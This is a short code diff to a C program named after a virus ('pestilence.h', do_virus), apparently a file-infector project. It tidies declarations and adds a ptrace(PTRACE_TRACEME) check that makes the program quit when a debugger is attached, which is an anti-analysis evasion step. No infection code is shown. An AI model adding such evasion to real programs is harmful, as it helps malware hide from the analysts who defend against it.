@@ -1,6 +1,6 @@
 #include "pestilence.h"
 
-void do_virus(char* dirName, t_woody *woody)
+void do_virus(char *dirName, t_woody *woody)
 {
     DIR *dir;
     struct dirent *ent;
@@ -40,6 +40,11 @@ int main(int argc, char **argv)
         return (ERROR_CODE);
     }
 
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
+    {
+        return (ERROR_CODE);
+    }
+
     t_woody woody;
     ft_memset(&woody, 0, sizeof(woody));
 
@@ -48,4 +53,3 @@ int main(int argc, char **argv)
 
     return (0);
 }
-
